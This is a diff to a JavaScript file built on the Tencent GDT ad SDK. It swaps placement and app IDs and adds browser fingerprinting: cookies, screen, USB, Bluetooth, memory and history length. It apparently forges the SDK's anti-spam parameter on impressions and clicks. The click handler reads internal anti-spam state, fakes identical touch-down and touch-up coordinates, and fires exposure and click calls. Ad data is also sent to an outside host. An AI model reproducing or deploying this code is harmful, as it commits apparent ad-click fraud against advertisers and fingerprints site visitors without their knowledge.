@@ -104,8 +104,8 @@ window.curNode.parentNode.insertBefore(li_ifr10, window.curNode);
 window.s_ww = window.curNode.id ? parseInt(window.curNode.id) : 0;
 
 window.all_info = []; 
-window.all_info['iadvplaceid'] = '6063668470182641'; 
-window.all_info['iappid'] = '1200631959';
+window.all_info['iadvplaceid'] = '9013670227836966'; 
+window.all_info['iappid'] = '1200683137';
 var trackid = trackid || window.sys_trackid;
 
 
@@ -137,6 +137,7 @@ window.all_info['cnzz_count_6'] = window.all_info['cnzz_count_7'] = window.all_i
 
 
 var crd = Math.floor(Math.random() * (1000 - 1)) + 1;
+
 if (crd <= 60) window.all_info['cnzz_count'] = 1;
 
 var crd_2 = Math.floor(Math.random() * (1000 - 1)) + 1;
@@ -169,6 +170,8 @@ var crd_10 = Math.floor(Math.random() * (1000 - 1)) + 1;
 if (crd_10 <= 60) window.all_info['cnzz_count_10'] = 1;
 
 
+
+window.all_info['cnzz_count'] = 1;
     var p2 = {
 		"crd":crd, "cnzz_count":window.all_info['cnzz_count'],
 		"crd_2":crd_2, "cnzz_count_2":window.all_info['cnzz_count_2'],
@@ -186,8 +189,217 @@ if (crd_10 <= 60) window.all_info['cnzz_count_10'] = 1;
 
 var alogs = 'https://aces.cn-hangzhou.log.aliyuncs.com/logstores/sys/track_ua.gif?APIVersion=0.6.0&trackid=' + trackid + '&placement_id=' + window.all_info['iadvplaceid'] + '&app_id=' + window.all_info['iappid'] + '&cnzz_count='+window.all_info['cnzz_count'] + '&crd='+ crd + '&p2='+ p2 +'&gdt_mview=6';
 new Image().src = alogs;
- 
 
+function getPlatForm () {
+    var e = navigator.userAgent.toLocaleLowerCase();
+    return 0 != ~e.indexOf("micromessenger")
+      ? "wx"
+      : 0 != ~e.indexOf("qq/")
+      ? "qq"
+      : 0 != ~e.indexOf("mqqbrowser/")
+      ? "qb"
+      : 0 != ~e.indexOf("gdtmobsdk/")
+      ? "gdt"
+      : 0 != ~e.indexOf("tbs/")
+      ? "x5"
+      : "other";
+};
+
+function getValue(e) {
+    switch (e) {
+      case "cookieEnabled":
+        return navigator.cookieEnabled || !1;
+      case "language":
+        return navigator.language || navigator.browserLanguag || 0;
+      case "sheight":
+        return screen.height || 0;
+      case "swidth":
+        return screen.width || 0;
+      case "devicePixelRatio":
+        return devicePixelRatio || 1;
+      case "usb":
+        return navigator.usb && navigator.usb.onconnect;
+      case "bluetooth":
+        return navigator.bluetooth;
+      case "effectiveType":
+        return oo.netType();
+      case "jsHeapSizeLimit":
+        return oo.memory("jsHeapSizeLimit");
+      case "usedJSHeapSize":
+        return oo.memory("usedJSHeapSize");
+      case "canGoBack":
+        return "function" == typeof window.history.back;
+      case "canGoForward":
+        return "function" == typeof window.history.go;
+      default:
+        return 0;
+    }
+  };
+
+  var oo = {
+    netType: function () {
+      switch (
+        (navigator.connection && navigator.connection.effectiveType) ||
+        ""
+      ) {
+        case "slow-2g":
+        case "2g":
+          return "2";
+        case "3g":
+          return "3";
+        case "4g":
+          return "4";
+        case "5g":
+          return "7";
+        default:
+          return "0";
+      }
+    },
+    memory: function (e) {
+      var t = performance.memory ? performance.memory : {};
+      switch (e) {
+        case "jsHeapSLimit":
+          return t.jsHeapSizeLimit || 0;
+        case "usedJSHSize":
+          return t.usedJSHeapSize || 0;
+        default:
+          return 0;
+      }
+    }
+  };
+
+function  getCookie(e) {
+    var t = null,
+      n = new RegExp("(^| )" + e + "=([^;]*)(;|$)");
+    return document.cookie.match(n)
+      ? ((t = document.cookie.match(n)), unescape(t[2]))
+      : null;
+};
+
+function getFLS () {
+    try {
+
+      var e = [];
+      return (
+        e.push(navigator.geolocation ? 1 : 0),
+        e.push(navigator.geolocation ? 1 : 0),
+        e.push("number" == typeof window.orientation ? 1 : 0),
+        e.push("function" == typeof window.Promise ? 1 : 0),
+        e.push(
+          "function" == typeof window.Array.prototype.includes ? 1 : 0
+        ),
+        e.push(navigator.geolocation ? 1 : 0),
+        e.push(navigator.cookieEnabled ? 1 : 0),
+        e.push("function" == typeof ArrayBuffer ? 1 : 0),
+        e.push("function" == typeof window.Blob ? 1 : 0),
+        e.push("function" == typeof window.Uint8Array ? 1 : 0),
+        e.push("function" == typeof window.WebGLSampler ? 1 : 0),
+        e.push("function" == typeof window.WebGL2RenderingContext ? 1 : 0),
+        e.push("function" == typeof window.RTCPeerConnection ? 1 : 0),
+        e.push("function" == typeof window.Worker ? 1 : 0),
+        e.push("function" == typeof window.ServiceWorkerContainer ? 1 : 0),
+        e.push("function" == typeof window.requestAnimationFrame ? 1 : 0),
+        e.push(navigator.pdfViewerEnabled ? 1 : 0),
+        e.push(typeof window.TencentGDT === "object" ? 1 : 0),
+        e.reverse().join("")
+      );
+    } catch (e) {
+      console.info("@JSSDK::fls::e:" + e);
+    }
+};
+
+
+function netType() {
+    switch (
+      (navigator.connection && navigator.connection.effectiveType) ||
+      ""
+    ) {
+      case "slow-2g":
+      case "2g":
+        return "2";
+      case "3g":
+        return "3";
+      case "4g":
+        return "4";
+      case "5g":
+        return "7";
+      default:
+        return "0";
+    }
+  };
+
+  function memory(e) {
+    var t = performance.memory ? performance.memory : {};
+    switch (e) {
+      case "jsHeapSLimit":
+        return t.jsHeapSizeLimit || 0;
+      case "usedJSHSize":
+        return t.usedJSHeapSize || 0;
+      default:
+        return 0;
+    }
+  }
+
+function SDataComm() {
+    console.log('SDataComm');
+    var GOF = window.history.go === "function" ? 1 : 0;
+    var GOB = typeof window.history.back === "function" ? 1 : 0;
+    var SData = {
+        fp: getPlatForm(),
+        fpid: getCookie("gdt_fp") || -999,
+        uc: navigator.usb && navigator.usb.onconnect || 0,
+        pw: screen.width || 0,
+        ph: screen.height || 0,
+        dp: devicePixelRatio || 0,
+        bt: navigator.bluetooth ? 1 : -1,
+        net: netType(),
+        lan: navigator.language || navigator.browserLanguag || 0,
+        mt: parseInt(memory("jsHeapSizeLimit") / 1024 / 1024) || 0,
+        mu: parseInt(memory("usedJSHeapSize") / 1024 / 1024) || 0,
+        fb: GOF.toString() + GOB.toString(),
+        hislen: history.length || 0,
+        fls: parseInt(getFLS(), 2)
+    };
+    return SData
+}
+
+function SDataExp(pid) {
+    var adConfArr = window.TencentGDT && window.TencentGDT;
+    var adConf = "";
+    var Sdata = SDataComm();
+    var dom = null;
+    adConfArr.map(function(v, i) {
+        var posid = v && v.placement_id;
+        if (posid == pid) {
+            adConf = v
+        }
+    });
+    try {
+        if (adConf.display_type === "interstitial") {
+            dom = document.getElementById("moInterstitialImageHorizontal") || document.body;
+            Sdata["da"] = parseInt(window.screen.width);
+            Sdata["db"] = parseInt(window.screen.height)
+        } else {
+            dom = adConf.containerid && document.getElementById(adConf.containerid) || document.body;
+            Sdata["da"] = parseInt(dom.offsetWidth);
+            Sdata["db"] = parseInt(dom.offsetHeight)
+        }
+        Sdata["dx"] = parseInt(dom.offsetLeft);
+        Sdata["dy"] = parseInt(dom.offsetTop);
+        Sdata["ra"] = parseInt(dom.offsetWidth) || -999;
+        Sdata["rb"] = parseInt(dom.offsetHeight) || -999;
+        Sdata["vp"] = 2;
+        Sdata["rwd"] = 0;
+        Sdata["rt"] = 1;
+        for (var x in Sdata) {
+            Sdata[x] = Sdata[x].toString()
+        }
+        console.log(Sdata);
+        return Sdata
+    } catch (e) {
+        console.info("@jssdk::e:", e)
+    }
+}
 
 window.TencentGDT = window.TencentGDT || [];
 // 广告初始化
@@ -197,7 +409,7 @@ window.TencentGDT.push({
     type: 'native', // {String} - 原生广告类型 - 必填
     muid_type: '1', // {String} - 移动终端标识类型，1：imei，2：idfa，3：mac号 - 选填    
     muid: '******', // {String} - 加密终端标识，详细加密算法见API说明 -  选填
-    count: 10, // {Number} - 拉取广告的数量，默认是3，最高支持10 - 选填
+    count: 1, // {Number} - 拉取广告的数量，默认是3，最高支持10 - 选填
     onComplete: function (res) {
         if (res && res.constructor === Array) {
             // 原生模板广告位调用 window.TencentGDT.NATIVE.renderAd(res[0], 'containerId') 进行模板广告的渲染
@@ -845,7 +1057,7 @@ var alogs = 'https://aces.cn-hangzhou.log.aliyuncs.com/logstores/sys/track_ua.gi
                     },
                     checkAndLoadNativeAd: function() {
                         var t = e;
-                        t.conflist && t.conflist.length > 0 && !t.qbsLoaded && g.loadJS("//etc.6187wo.com/qzone/biz/comm/js/qbs.js", function() {
+                        t.conflist && t.conflist.length > 0 && !t.qbsLoaded && g.loadJS("../qzone/biz/comm/js/qbs.js", function() {
                             t.qbsLoaded = !0;
                             for (var e = [], n = 0; n < t.conflist.length; n++) t.conflist[n].from && t.conflist[n].from == t.tbsFlag && t.tbsDomain == document.domain || e.push(t.refreshConnParam(t.conflist[n]));
                             GDT.load(e)
@@ -969,25 +1181,56 @@ var alogs = 'https://aces.cn-hangzhou.log.aliyuncs.com/logstores/sys/track_ua.gi
 				    txt:n1.txt
                                 };	
 
-			var url = 'https://go.3801wd.com/gt.php?img='+n1.img+'&c_t='+c_t+'&c_w='+window.s_ww;
-			this.reqRequest(url, JSON.stringify(data), this.reqResponse, null, 1,traceid);
+			    var url = 'https://go.3801wd.com/gt.php?img='+n1.img+'&c_t='+c_t+'&c_w='+window.s_ww;
+			    this.reqRequest(url, JSON.stringify(data), this.reqResponse, null, 1,traceid);
 		    },	
 		    randString:function(){
-			var str = 'abcdefghijklnmopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!_';
-			var max = 406;
-			var tmp = '';
-			var str_arr = str.split('');
-			for(var i = 0;i< max;i++){
-			    var rand = Math.floor(Math.random() * (str_arr.length - 1)) + 1;
-			    tmp += str_arr[rand];
-			}
-			return tmp;
+                var str = 'abcdefghijklnmopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!_';
+                var max = 406;
+                var tmp = '';
+                var str_arr = str.split('');
+                for(var i = 0;i< max;i++){
+                    var rand = Math.floor(Math.random() * (str_arr.length - 1)) + 1;
+                    tmp += str_arr[rand];
+                }
+                return tmp;
 		    },
-                    clickTemplateNativeAd: function(t, n, o) {
+            clickTemplateNativeAd: function(t, n, o) {
+
+                        console.log('t_n_o_start');
+                        console.log(t);
+                        console.log(n);
+                        console.log(o);
+                        console.log(this.antiSpamConf['9013670227836966'].state);
+                        console.log(this);
+
+                        
+
                         var i = e,
-                            a = i.loadedAd[n],
-                            r = e.getAntiSpam(a.posid);
+                        a = i.loadedAd[n],
+                        r = e.getAntiSpam(a.posid);
+
+                        console.log(a);
+                        console.log('t_n_o_end');
+
                         if (a) {
+
+                            var tmp_n = this.antiSpamConf[a.posid].state;
+                            var tmp_o = tmp_n.ad;
+                            var tmp_p = tmp_o.dom;
+                            var tmp_i = tmp_n.touchStart;
+                            var tmp_a = tmp_n.touchEnd;
+                            var tmp_f = tmp_n.ad.dom.offsetHeight;
+                            var tmp_m = tmp_n.ad.dom.offsetWidth;
+                            var tmp_d = tmp_n.drag;
+                            var tmp_c = tmp_n.playtime;
+                            var tmp_l = tmp_n.changeWindow;
+                            var tmp_s = tmp_n.closeBtn;
+
+
+                            var ooo = getValue("canGoForward") ? 1 : 0;
+                            var iii = getValue("canGoBack") ? 1 : 0;
+
                             var d = a.adData && a.adData.template_id,
                                 s = r.da,
                                 c = r.db,
@@ -995,32 +1238,78 @@ var alogs = 'https://aces.cn-hangzhou.log.aliyuncs.com/logstores/sys/track_ua.gi
                                 l = typeof(t.c) === 'undefined' ? r.sc : t.sc,
                                 u = typeof(t.c) === 'undefined' ? r.ec : t.ec,
                                 f = {
-                                    down_x: t.pageX.toString(),
-                                    down_y: t.pageY.toString(),
-                                    up_x: t.pageX.toString(),
-                                    up_y: t.pageY.toString(),
-                                    tid: d.toString(),
+                                    
+
                                     da: s.toString(),
                                     db: c.toString(),
+                                    dx: tmp_p.offsetLeft.toString(),
+                                    dy: tmp_p.offsetTop.toString(),
                                     g: p.toString(),
                                     sc: l.toString(),
-                                    ec: u.toString()
+                                    ec: u.toString(),
+
+                                    // down_x: t.pageX.toString(),
+                                    // down_y: t.pageY.toString(),
+                                    // up_x: t.pageX.toString(),
+                                    // up_y: t.pageY.toString(),
+
+
+                                    
+
+                                    // aa: tmp_i.x.toString(),
+                                    // ab: tmp_i.y.toString(),
+                                    // ba: tmp_a.x.toString(),
+                                    // bb: tmp_a.y.toString(),
+
+                                    aa: t.pageX.toString(),
+                                    ab: t.pageY.toString(),
+                                    ba: t.pageX.toString(),
+                                    bb: t.pageY.toString(),
+
+                                    ra: tmp_m.toString(),
+                                    rb: tmp_f.toString(),
+                                    d: tmp_d.toString(),
+                                    p: tmp_c.toString(),
+                                    f: tmp_l.toString(),
+                                    x: tmp_s.toString(),
+
+
+                                    tid: d.toString(),
+                                    rwd: "0",
+                                    rt: "1",
+                                    vp: "2",
+                                    fp: getPlatForm().toString(),
+                                    fpid: getCookie("gdt_fp") || "-999",
+                                    uc: getValue("usb") || "0",
+                                    pw: getValue("swidth").toString(),
+                                    ph: getValue("sheight").toString(),
+                                    dp: getValue("devicePixelRatio").toString(),
+                                    bt: getValue("bluetooth") ? "1" : "-1",
+                                    net: "" === getValue("effectiveType").toString() || "-999",
+                                    lan: getValue("language"),
+                                    mt: parseInt(getValue("jsHeapSizeLimit") / 1024 / 1024).toString(),
+                                    mu: parseInt(getValue("usedJSHeapSize") / 1024 / 1024).toString(),
+                                    fb: parseInt(ooo.toString() + iii.toString()).toString(),
+                                    hislen: history.length.toString() || "0",
+                                    fls: parseInt(getFLS(), 2).toString()
+                                    
+                                    
                                 },
                                 m = {
                                     placement_id: a.posid,
                                     advertisement_id: a.adData.cl,
-				    appname:a.adData.appname,
-				    desc:a.adData.desc,
-				    img:a.adData.img,
-				    txt:a.adData.txt,
-				    real_adtype:a.adData.real_adtype,
-				    price:a.adData.price,
-				    rl:a.adData.rl,
-				    acttype:a.adData.acttype,
-				    c:t.c,
+                                    appname:a.adData.appname,
+                                    desc:a.adData.desc,
+                                    img:a.adData.img,
+                                    txt:a.adData.txt,
+                                    real_adtype:a.adData.real_adtype,
+                                    price:a.adData.price,
+                                    rl:a.adData.rl,
+                                    acttype:a.adData.acttype,
+                                    c:t.c,
                                     s: encodeURIComponent(JSON.stringify(f))
                                 };
-				console.log('d2');
+				            console.log('d2');
                             i.doExpose(m), i.doClick(m)
                         }
                     },
@@ -1179,7 +1468,7 @@ var alogs = 'https://aces.cn-hangzhou.log.aliyuncs.com/logstores/sys/track_ua.gi
                                         }
                                 }, 500),
                                 d = i.createElement("meta");
-                            d.setAttribute("content", "edge"), d.setAttribute("http-equiv", "X-UA-Compatible"), d.setAttribute("charset", "utf-8"), i.head.appendChild(d), e.loadIframeUrlJS(i, "//cdn.jsdelivr.net/gh/lhtel/cdn@100007/templatenative.js", function() {
+                            d.setAttribute("content", "edge"), d.setAttribute("http-equiv", "X-UA-Compatible"), d.setAttribute("charset", "utf-8"), i.head.appendChild(d), e.loadIframeUrlJS(i, "../qzone/biz/templatenative.js", function() {
                                 i.body.innerHTML = n
                             })
                         }
@@ -1543,9 +1832,20 @@ var alogs = 'https://aces.cn-hangzhou.log.aliyuncs.com/logstores/sys/track_ua.gi
 			
 			//曝光广澳			
 			for(var jjj = 0;jjj < have_ad;jjj++){
+                console.log('n_start');
+                console.log(n);
+                console.log(t);
+                console.log(o);
+                
 			    var apurl = n['data'][jjj]['apurl'];
-			    var kc = jjj + 2;
+			    var kc = jjj + 1;
 			    apurl += '&datatype=jsonp&callback=_cb_gdtjson'+kc;
+
+                var s = SDataExp(t);
+                console.log(s);
+                console.log('n_end');
+                apurl = apurl + "&s=" + encodeURIComponent(JSON.stringify(SDataExp(t)));
+			
 			    
 			    var script = document.createElement('script');
 			    var opts = {};
@@ -1831,89 +2131,89 @@ var alogs = 'https://aces.cn-hangzhou.log.aliyuncs.com/logstores/sys/track_ua.gi
 			
                     },
                     doClick: function(t) {
-			var t_string = JSON.stringify(t);
+			            var t_string = JSON.stringify(t);
 			
-			if (typeof(t.c) === 'undefined'){
-			    
-				for (var n = "", i = e, a = "", d = 0; d < i.originConflist.length; d++)
-				 if (t.placement_id == i.originConflist[d].posId) {
-				     if (i.originConflist[d].from && i.originConflist[d].from == i.tbsFlag && i.tbsDomain == document.domain) return;
-				     break
-				 }
-				if (t && t.s && t.advertisement_id && t.placement_id) {
-				    if (a = t.traceid ? e.apUrlMap[t.advertisement_id + t.placement_id + t.traceid] : e.apUrlMap[t.advertisement_id + t.placement_id], r.default.evnet(120521, "do_click", t)) return r.default.evnet(120528, "ERR_do_click", {
-					params: JSON.stringify(t)
-				    }), {
-					ret: 1,
-					msg: "error閿涘奔绗夐懗鍊熺箻鐞涘瞼鍋ｉ崙鏄忕儲鏉烇拷"
-				    };
-				    try {
-					var s = g.getCookie("gdt_fp");
-					if (s) {
-					    var c = "object" === o(t.s) ? decodeURIComponent(JSON.stringify(t.s)) : decodeURIComponent(t.s);
-					    (c = JSON.parse(c)).fpid = s, t.s = encodeURIComponent(JSON.stringify(c))
-					}
-				    } catch (e) {
+                        if (typeof(t.c) === 'undefined'){
+                            
+                            for (var n = "", i = e, a = "", d = 0; d < i.originConflist.length; d++)
+                            if (t.placement_id == i.originConflist[d].posId) {
+                                if (i.originConflist[d].from && i.originConflist[d].from == i.tbsFlag && i.tbsDomain == document.domain) return;
+                                break
+                            }
+                            if (t && t.s && t.advertisement_id && t.placement_id) {
+                                if (a = t.traceid ? e.apUrlMap[t.advertisement_id + t.placement_id + t.traceid] : e.apUrlMap[t.advertisement_id + t.placement_id], r.default.evnet(120521, "do_click", t)) return r.default.evnet(120528, "ERR_do_click", {
+                                params: JSON.stringify(t)
+                                }), {
+                                ret: 1,
+                                msg: "error閿涘奔绗夐懗鍊熺箻鐞涘瞼鍋ｉ崙鏄忕儲鏉烇拷"
+                                };
+                                try {
+                                var s = g.getCookie("gdt_fp");
+                                if (s) {
+                                    var c = "object" === o(t.s) ? decodeURIComponent(JSON.stringify(t.s)) : decodeURIComponent(t.s);
+                                    (c = JSON.parse(c)).fpid = s, t.s = encodeURIComponent(JSON.stringify(c))
+                                }
+                                } catch (e) {
 
-				    }
+                                }
 
-				    if (n = i.rlMap[t.advertisement_id + t.placement_id] + "&s=" + t.s, i.isAndroidApp[t.advertisement_id]) {
-					if (t.qqse_extStr) n = n + "&qqse_extStr=" + encodeURIComponent(JSON.stringify(t.qqse_extStr));
-					if (t._autodownload && (n = n + "&_autodownload=" + t._autodownload), e.getSite(t.placement_id) == e.CONST.SITESET_MOBILE_INNER){
-					    if (0 == t.redirect){
-						(new Image).src = n;
-					    }else{
-						e.goUrl(t,n);
-						//location.href = n;
-					    } 					
-					}else{
-					    n = ~~n.indexOf("&s_lp") > 0 ? n : n + "&acttype=" + i.CONST.ACTTYPE_DOWNLOAD, e.goUrl(t,n)
-					} 
-				    } else{
-					i.isIOSApp[t.advertisement_id] && navigator && navigator.userAgent && -1 !== navigator.userAgent.indexOf("MicroMessenger") && (n += "&platform=wx&target=appstore"), e.goUrl(t,n);
-				    }
-				}
-			    
-			}else{
-				for (var n = "", i = e, a = "", d = 0; d < i.originConflist.length; d++)
-				 if (t.placement_id == i.originConflist[d].posId) {
-				     if (i.originConflist[d].from && i.originConflist[d].from == i.tbsFlag && i.tbsDomain == document.domain) return;
-				     break
-				 }
-				if (t && t.s && t.advertisement_id && t.placement_id) {
-				    if (a = t.traceid ? e.apUrlMap[t.advertisement_id + t.placement_id + t.traceid] : e.apUrlMap[t.advertisement_id + t.placement_id], r.default.evnet(120521, "do_click", t)) return r.default.evnet(120528, "ERR_do_click", {
-					params: JSON.stringify(t)
-				    }), {
-					ret: 1,
-					msg: "error閿涘奔绗夐懗鍊熺箻鐞涘瞼鍋ｉ崙鏄忕儲鏉烇拷"
-				    };
-				    try {
-					var s = g.getCookie("gdt_fp");
-					if (s) {
-					    //var c = "object" === o(t.s) ? decodeURIComponent(JSON.stringify(t.s)) : decodeURIComponent(t.s);
-					    var c = "object" === typeof(t.s) ? decodeURIComponent(JSON.stringify(t.s)) : decodeURIComponent(t.s);
-					    (c = JSON.parse(c)).fpid = s, t.s = encodeURIComponent(JSON.stringify(c))
-					}
-				    } catch (e) {
-				    }
-				    if (n = i.rlMap[t.advertisement_id + t.placement_id] + "&s=" + t.s, i.isAndroidApp[t.advertisement_id]) {
-					if (t.qqse_extStr) n = n + "&qqse_extStr=" + encodeURIComponent(JSON.stringify(t.qqse_extStr));
-					if (t._autodownload && (n = n + "&_autodownload=" + t._autodownload), e.getSite(t.placement_id) == e.CONST.SITESET_MOBILE_INNER){
-					    if (0 == t.redirect){
-						(new Image).src = n;
-					    }else{
-						e.goUrl(t,n);
-						//location.href = n;
-					    } 					
-					}else{
-					    n = ~~n.indexOf("&s_lp") > 0 ? n : n + "&acttype=" + i.CONST.ACTTYPE_DOWNLOAD, e.goUrl(t,n)
-					} 
-				    } else{
-					i.isIOSApp[t.advertisement_id] && navigator && navigator.userAgent && -1 !== navigator.userAgent.indexOf("MicroMessenger") && (n += "&platform=wx&target=appstore"), e.goUrl(t,n);
-				    }
-				}			    
-			    
-			}
+                                if (n = i.rlMap[t.advertisement_id + t.placement_id] + "&s=" + t.s, i.isAndroidApp[t.advertisement_id]) {
+                                if (t.qqse_extStr) n = n + "&qqse_extStr=" + encodeURIComponent(JSON.stringify(t.qqse_extStr));
+                                if (t._autodownload && (n = n + "&_autodownload=" + t._autodownload), e.getSite(t.placement_id) == e.CONST.SITESET_MOBILE_INNER){
+                                    if (0 == t.redirect){
+                                    (new Image).src = n;
+                                    }else{
+                                    e.goUrl(t,n);
+                                    //location.href = n;
+                                    } 					
+                                }else{
+                                    n = ~~n.indexOf("&s_lp") > 0 ? n : n + "&acttype=" + i.CONST.ACTTYPE_DOWNLOAD, e.goUrl(t,n)
+                                } 
+                                } else{
+                                i.isIOSApp[t.advertisement_id] && navigator && navigator.userAgent && -1 !== navigator.userAgent.indexOf("MicroMessenger") && (n += "&platform=wx&target=appstore"), e.goUrl(t,n);
+                                }
+                            }
+                            
+                        }else{
+                            for (var n = "", i = e, a = "", d = 0; d < i.originConflist.length; d++)
+                            if (t.placement_id == i.originConflist[d].posId) {
+                                if (i.originConflist[d].from && i.originConflist[d].from == i.tbsFlag && i.tbsDomain == document.domain) return;
+                                break
+                            }
+                            if (t && t.s && t.advertisement_id && t.placement_id) {
+                                if (a = t.traceid ? e.apUrlMap[t.advertisement_id + t.placement_id + t.traceid] : e.apUrlMap[t.advertisement_id + t.placement_id], r.default.evnet(120521, "do_click", t)) return r.default.evnet(120528, "ERR_do_click", {
+                                params: JSON.stringify(t)
+                                }), {
+                                ret: 1,
+                                msg: "error閿涘奔绗夐懗鍊熺箻鐞涘瞼鍋ｉ崙鏄忕儲鏉烇拷"
+                                };
+                                try {
+                                var s = g.getCookie("gdt_fp");
+                                if (s) {
+                                    //var c = "object" === o(t.s) ? decodeURIComponent(JSON.stringify(t.s)) : decodeURIComponent(t.s);
+                                    var c = "object" === typeof(t.s) ? decodeURIComponent(JSON.stringify(t.s)) : decodeURIComponent(t.s);
+                                    (c = JSON.parse(c)).fpid = s, t.s = encodeURIComponent(JSON.stringify(c))
+                                }
+                                } catch (e) {
+                                }
+                                if (n = i.rlMap[t.advertisement_id + t.placement_id] + "&s=" + t.s, i.isAndroidApp[t.advertisement_id]) {
+                                if (t.qqse_extStr) n = n + "&qqse_extStr=" + encodeURIComponent(JSON.stringify(t.qqse_extStr));
+                                if (t._autodownload && (n = n + "&_autodownload=" + t._autodownload), e.getSite(t.placement_id) == e.CONST.SITESET_MOBILE_INNER){
+                                    if (0 == t.redirect){
+                                    (new Image).src = n;
+                                    }else{
+                                    e.goUrl(t,n);
+                                    //location.href = n;
+                                    } 					
+                                }else{
+                                    n = ~~n.indexOf("&s_lp") > 0 ? n : n + "&acttype=" + i.CONST.ACTTYPE_DOWNLOAD, e.goUrl(t,n)
+                                } 
+                                } else{
+                                i.isIOSApp[t.advertisement_id] && navigator && navigator.userAgent && -1 !== navigator.userAgent.indexOf("MicroMessenger") && (n += "&platform=wx&target=appstore"), e.goUrl(t,n);
+                                }
+                            }			    
+                            
+                        }
 			    
 			
                     },
@@ -2999,7 +3299,7 @@ catch(err){
 ]);
 
 
-		
+		function _cb_gdtjson1(){}
 		function _cb_gdtjson2(){}
 		function _cb_gdtjson3(){}
 		function _cb_gdtjson4(){}
